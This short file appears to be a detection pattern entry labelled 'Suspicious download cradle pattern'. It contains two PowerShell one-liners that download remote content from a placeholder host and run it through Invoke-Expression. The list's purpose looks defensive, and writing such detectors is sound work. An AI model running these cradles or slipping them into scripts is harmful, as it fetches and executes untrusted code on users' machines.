# Suspicious download cradle pattern
IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload')
Invoke-Expression (Invoke-WebRequest -Uri 'http://example.com' -UseBasicParsing).Content
